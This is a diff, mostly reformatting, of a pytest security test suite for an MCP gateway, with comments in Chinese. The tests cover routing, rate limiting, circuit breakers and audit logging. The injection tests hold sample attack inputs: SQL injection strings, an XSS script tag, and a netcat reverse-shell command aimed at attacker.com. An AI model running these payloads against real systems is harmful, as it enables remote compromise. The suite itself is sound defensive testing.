@@ -12,14 +12,12 @@ MCP Servers 红白对抗诊断测试（Pytest 兼容版）
 范围：BaseMCPServer → 8 Server → MCPGateway → RateLimiter → AuditLogger → CircuitBreaker
 覆盖：OWASP Agentic Top 10 · 注入攻击 · 越权 · 熔断 · 限流 · 审计完整性
 """
+
 from __future__ import annotations
 
-import json
 import sys
 import time
 from pathlib import Path
-
-import pytest
 
 if sys.stdout.encoding != "utf-8":
     sys.stdout.reconfigure(encoding="utf-8")
@@ -32,6 +30,7 @@ sys.path.insert(0, str(_PROJECT_ROOT))
 # ============================================================================
 # 阶段0：全部 MCP 模块导入测试
 # ============================================================================
+
 
 def test_00_imports_all_mcp_modules():
     """测试 8 Server + Gateway + 支撑模块全部可导入"""
@@ -66,6 +65,7 @@ def test_00_imports_all_mcp_modules():
 # 阶段1：Gateway 初始化——9 路由（8 Server + gateway自身）全部就绪
 # ============================================================================
 
+
 def test_01_gateway_initializes_all_routes():
     """Gateway 初始化后 8 Server 路由表 + self 全部存在"""
     from zephyr.infrastructure.gateway_server import create_gateway
@@ -74,9 +74,15 @@ def test_01_gateway_initializes_all_routes():
     routes = gw._routes
 
     expected_sids = [
-        "task_manager", "knowledge_base", "gate_engine",
-        "session_handoff", "intent_router", "blueprint_search",
-        "sandbox", "governance", "telemetry",
+        "task_manager",
+        "knowledge_base",
+        "gate_engine",
+        "session_handoff",
+        "intent_router",
+        "blueprint_search",
+        "sandbox",
+        "governance",
+        "telemetry",
     ]
     for sid in expected_sids:
         assert sid in routes, f"Route table missing: {sid}"
@@ -98,15 +104,20 @@ def test_02_gateway_registered_tools():
 # 阶段2：Gateway Request 路由——正确/错误/越权场景
 # ============================================================================
 
+
 def test_03_initialize():
     """Gateway initialize 返回协议版本 + serverInfo"""
     from zephyr.infrastructure.gateway_server import create_gateway
 
     gw = create_gateway()
-    resp = gw.handle_request({
-        "jsonrpc": "2.0", "id": 1, "method": "initialize",
-        "params": {"protocolVersion": "2024-11-05"},
-    })
+    resp = gw.handle_request(
+        {
+            "jsonrpc": "2.0",
+            "id": 1,
+            "method": "initialize",
+            "params": {"protocolVersion": "2024-11-05"},
+        }
+    )
     assert resp.get("result", {}).get("serverInfo", {}).get("name") == "mcp_gateway"
     assert resp["result"]["protocolVersion"] == "2024-11-05"
 
@@ -136,30 +147,38 @@ def test_05_tools_list_aggregation():
 
 def test_06_tool_call_not_found():
     """调用不存在的 tool 返回 ERR_TOOL_NOT_FOUND"""
-    from zephyr.infrastructure.gateway_server import create_gateway
     from zephyr.infrastructure.error_codes import ERR_TOOL_NOT_FOUND
+    from zephyr.infrastructure.gateway_server import create_gateway
 
     gw = create_gateway()
-    resp = gw.handle_request({
-        "jsonrpc": "2.0", "id": 4, "method": "tools/call",
-        "params": {"name": "nonexistent.ghost_tool", "arguments": {}},
-        "_session_id": "attacker-001",
-    })
+    resp = gw.handle_request(
+        {
+            "jsonrpc": "2.0",
+            "id": 4,
+            "method": "tools/call",
+            "params": {"name": "nonexistent.ghost_tool", "arguments": {}},
+            "_session_id": "attacker-001",
+        }
+    )
     assert resp.get("error") is not None
     assert resp["error"]["code"] == ERR_TOOL_NOT_FOUND
 
 
 def test_07_tool_call_missing_name():
     """tools/call 无 name 参数返回 ERR_INVALID_PARAMS"""
-    from zephyr.infrastructure.gateway_server import create_gateway
     from zephyr.infrastructure.error_codes import ERR_INVALID_PARAMS
+    from zephyr.infrastructure.gateway_server import create_gateway
 
     gw = create_gateway()
-    resp = gw.handle_request({
-        "jsonrpc": "2.0", "id": 5, "method": "tools/call",
-        "params": {"arguments": {}},
-        "_session_id": "attacker-002",
-    })
+    resp = gw.handle_request(
+        {
+            "jsonrpc": "2.0",
+            "id": 5,
+            "method": "tools/call",
+            "params": {"arguments": {}},
+            "_session_id": "attacker-002",
+        }
+    )
     assert resp.get("error") is not None
     assert resp["error"]["code"] == ERR_INVALID_PARAMS
 
@@ -168,10 +187,10 @@ def test_07_tool_call_missing_name():
 # 阶段3：攻击面——注入攻击 / 超长参数 / 恶意 JSON
 # ============================================================================
 
+
 def test_08_sql_injection_in_tool_name():
     """SQL 注入 payload 在 tool_name 中——应被路由拒绝"""
     from zephyr.infrastructure.gateway_server import create_gateway
-    from zephyr.infrastructure.error_codes import ERR_TOOL_NOT_FOUND
 
     gw = create_gateway()
     payloads = [
@@ -181,11 +200,15 @@ def test_08_sql_injection_in_tool_name():
         "1' UNION SELECT * FROM users--",
     ]
     for p in payloads:
-        resp = gw.handle_request({
-            "jsonrpc": "2.0", "id": 99, "method": "tools/call",
-            "params": {"name": p, "arguments": {}},
-            "_session_id": "sqli-attacker",
-        })
+        resp = gw.handle_request(
+            {
+                "jsonrpc": "2.0",
+                "id": 99,
+                "method": "tools/call",
+                "params": {"name": p, "arguments": {}},
+                "_session_id": "sqli-attacker",
+            }
+        )
         assert resp.get("error") is not None, f"SQLi payload {p!r} should be rejected"
 
 
@@ -194,14 +217,18 @@ def test_09_xss_in_arguments():
     from zephyr.infrastructure.gateway_server import create_gateway
 
     gw = create_gateway()
-    resp = gw.handle_request({
-        "jsonrpc": "2.0", "id": 100, "method": "tools/call",
-        "params": {
-            "name": "mcp_gateway.health_status",
-            "arguments": {"xss": '<script>alert("xss")</script>'},
-        },
-        "_session_id": "xss-attacker",
-    })
+    resp = gw.handle_request(
+        {
+            "jsonrpc": "2.0",
+            "id": 100,
+            "method": "tools/call",
+            "params": {
+                "name": "mcp_gateway.health_status",
+                "arguments": {"xss": '<script>alert("xss")</script>'},
+            },
+            "_session_id": "xss-attacker",
+        }
+    )
     assert resp.get("result") is not None or resp.get("error") is not None
     assert "status" in str(resp.get("result", "")).lower() or resp.get("error") is not None
 
@@ -219,14 +246,18 @@ def test_10_command_injection_in_arguments():
         "; nc -e /bin/sh attacker.com 4444",
     ]
     for p in payloads:
-        resp = gw.handle_request({
-            "jsonrpc": "2.0", "id": 101, "method": "tools/call",
-            "params": {
-                "name": "mcp_gateway.health_status",
-                "arguments": {"cmd": p},
-            },
-            "_session_id": "cmd-inj-attacker",
-        })
+        resp = gw.handle_request(
+            {
+                "jsonrpc": "2.0",
+                "id": 101,
+                "method": "tools/call",
+                "params": {
+                    "name": "mcp_gateway.health_status",
+                    "arguments": {"cmd": p},
+                },
+                "_session_id": "cmd-inj-attacker",
+            }
+        )
         safe = resp.get("result") is not None or resp.get("error") is not None
         assert safe, f"Gateway crashed on cmd inj payload: {p!r}"
 
@@ -237,14 +268,18 @@ def test_11_oversized_payload():
 
     gw = create_gateway()
     huge_string = "A" * 100_000
-    resp = gw.handle_request({
-        "jsonrpc": "2.0", "id": 102, "method": "tools/call",
-        "params": {
-            "name": "mcp_gateway.health_status",
-            "arguments": {"data": huge_string},
-        },
-        "_session_id": "oom-attacker",
-    })
+    resp = gw.handle_request(
+        {
+            "jsonrpc": "2.0",
+            "id": 102,
+            "method": "tools/call",
+            "params": {
+                "name": "mcp_gateway.health_status",
+                "arguments": {"data": huge_string},
+            },
+            "_session_id": "oom-attacker",
+        }
+    )
     safe = resp.get("result") is not None or resp.get("error") is not None
     assert safe, "Gateway crashed on 100KB payload"
 
@@ -260,14 +295,18 @@ def test_12_deeply_nested_arguments():
         current["nested"] = {}
         current = current["nested"]
 
-    resp = gw.handle_request({
-        "jsonrpc": "2.0", "id": 103, "method": "tools/call",
-        "params": {
-            "name": "mcp_gateway.health_status",
-            "arguments": nested,
-        },
-        "_session_id": "nest-attacker",
-    })
+    resp = gw.handle_request(
+        {
+            "jsonrpc": "2.0",
+            "id": 103,
+            "method": "tools/call",
+            "params": {
+                "name": "mcp_gateway.health_status",
+                "arguments": nested,
+            },
+            "_session_id": "nest-attacker",
+        }
+    )
     safe = resp.get("result") is not None or resp.get("error") is not None
     assert safe, "Gateway crashed on deeply nested JSON"
 
@@ -275,6 +314,7 @@ def test_12_deeply_nested_arguments():
 # ============================================================================
 # 阶段4：速率限制——10 QPS 阈值验证
 # ============================================================================
+
 
 def test_13_rate_limit_burst():
     """连续 35 次快速有效调用（超过 burst=30）——应触发限流"""
@@ -284,11 +324,15 @@ def test_13_rate_limit_burst():
     gw = create_gateway()
     rejections = 0
     for i in range(35):
-        resp = gw.handle_request({
-            "jsonrpc": "2.0", "id": 200 + i, "method": "tools/call",
-            "params": {"name": "mcp_gateway.list_servers", "arguments": {}},
-            "_session_id": "burst-client",
-        })
+        resp = gw.handle_request(
+            {
+                "jsonrpc": "2.0",
+                "id": 200 + i,
+                "method": "tools/call",
+                "params": {"name": "mcp_gateway.list_servers", "arguments": {}},
+                "_session_id": "burst-client",
+            }
+        )
         if resp.get("error") and RATE_LIMITED_KEY in str(resp["error"].get("message", "")):
             rejections += 1
 
@@ -299,17 +343,22 @@ def test_13_rate_limit_burst():
 # 阶段5：熔断器——连续失败 → OPEN → 自动恢复
 # ============================================================================
 
+
 def test_14_circuit_breaker_open_after_failures():
     """连续 3 次对不存在 tool 的调用——circuit breaker 应进入 OPEN"""
     from zephyr.infrastructure.gateway_server import create_gateway
 
     gw = create_gateway()
     for i in range(4):
-        gw.handle_request({
-            "jsonrpc": "2.0", "id": 300 + i, "method": "tools/call",
-            "params": {"name": "invalid.broken_tool", "arguments": {}},
-            "_session_id": "cb-test-client",
-        })
+        gw.handle_request(
+            {
+                "jsonrpc": "2.0",
+                "id": 300 + i,
+                "method": "tools/call",
+                "params": {"name": "invalid.broken_tool", "arguments": {}},
+                "_session_id": "cb-test-client",
+            }
+        )
 
     cb = gw._circuit_breakers.get("invalid")
     if cb:
@@ -318,7 +367,6 @@ def test_14_circuit_breaker_open_after_failures():
 
 def test_15_circuit_breaker_recovery():
     """OPEN 后等待 recovery → HALF_OPEN → 成功后 CLOSED"""
-    from zephyr.infrastructure.gateway_server import create_gateway
     from zephyr.infrastructure.gateway_server import CircuitBreaker
 
     cb = CircuitBreaker("test_recovery", failure_threshold=2, recovery_timeout_seconds=0.1)
@@ -336,6 +384,7 @@ def test_15_circuit_breaker_recovery():
 # 阶段6：审计日志完整性
 # ============================================================================
 
+
 def test_16_audit_log_call_records():
     """每次 tools/call 都会记录审计日志"""
     from zephyr.infrastructure.gateway_server import create_gateway
@@ -343,11 +392,15 @@ def test_16_audit_log_call_records():
     gw = create_gateway()
     initial = gw._audit.stats("audit-test-client").get("total_calls", 0)
 
-    gw.handle_request({
-        "jsonrpc": "2.0", "id": 400, "method": "tools/call",
-        "params": {"name": "mcp_gateway.health_status", "arguments": {}},
-        "_session_id": "audit-test-client",
-    })
+    gw.handle_request(
+        {
+            "jsonrpc": "2.0",
+            "id": 400,
+            "method": "tools/call",
+            "params": {"name": "mcp_gateway.health_status", "arguments": {}},
+            "_session_id": "audit-test-client",
+        }
+    )
     final = gw._audit.stats("audit-test-client").get("total_calls", 0)
     assert final >= initial, "Audit should record the call"
 
@@ -355,6 +408,7 @@ def test_16_audit_log_call_records():
 # ============================================================================
 # 阶段7：8 Server 实例独立性——各自正确响应
 # ============================================================================
+
 
 def test_17_knowledge_base_server_instance():
     """KnowledgeBaseServer 实例化 + tools/list 有内容"""
@@ -416,6 +470,7 @@ def test_21_governance_server_instance():
 # 阶段8：Sandbox 处于 planning 状态——不应阻塞 Gateway
 # ============================================================================
 
+
 def test_22_sandbox_server_planning_does_not_crash_gateway():
     """sandbox 状态为 planning 时 Gateway 仍可正常启动"""
     from zephyr.infrastructure.gateway_server import create_gateway
@@ -429,6 +484,7 @@ def test_22_sandbox_server_planning_does_not_crash_gateway():
 # ============================================================================
 # 阶段9：Gateway 全量聚合——tools/list 应包含 governance/telemetry
 # ============================================================================
+
 
 def test_23_aggregated_list_includes_governance():
     """tools/list 聚合结果应包含 governance.* 工具（telemetry 使用 FastMCP 独立运行）"""
@@ -448,14 +504,16 @@ def test_23b_telemetry_is_standalone_fastmcp():
     from zephyr.infrastructure.telemetry_server import TelemetryMCP
 
     tm = TelemetryMCP()
-    has_tools = hasattr(tm, '_tools') or hasattr(tm, '_tool_manager')
-    assert has_tools or not hasattr(tm, 'handle_request'), \
+    has_tools = hasattr(tm, "_tools") or hasattr(tm, "_tool_manager")
+    assert has_tools or not hasattr(tm, "handle_request"), (
         "TelemetryMCP is FastMCP-based, uses different API than BaseMCPServer — standalone stdio mode"
+    )
 
 
 # ============================================================================
 # 阶段10：路由精度——prefix→sid 映射精确无歧义
 # ============================================================================
+
 
 def test_24_route_prefix_accuracy():
     """所有 Server prefix 精确无歧义路由"""
